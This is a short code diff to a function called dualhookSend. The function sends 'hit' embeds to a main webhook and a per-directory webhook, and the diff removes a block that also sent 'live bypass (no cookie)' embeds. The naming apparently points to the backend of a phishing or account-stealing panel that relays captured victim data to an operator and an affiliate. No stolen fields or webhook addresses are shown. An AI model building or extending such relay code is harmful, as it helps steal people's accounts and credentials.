@@ -306,14 +306,6 @@ export async function dualhookSend(
     sendHitEmbed(mainUrl, d, { tag: `${tag} · Main` }),
     dirUrl ? sendHitEmbed(dirUrl, d, { tag: `${tag} · ${dir?.name || 'Directory'}` }) : Promise.resolve(),
   ]);
-
-  // Live bypass (no cookie)
-  const liveMain = getWebhook(WK.liveBypass);
-  const liveDir = dir?.liveBypassWebhook || '';
-  await Promise.all([
-    sendLiveBypassEmbed(liveMain, d),
-    liveDir ? sendLiveBypassEmbed(liveDir, d) : Promise.resolve(),
-  ]);
 }
 
 // Notify when a new directory is created
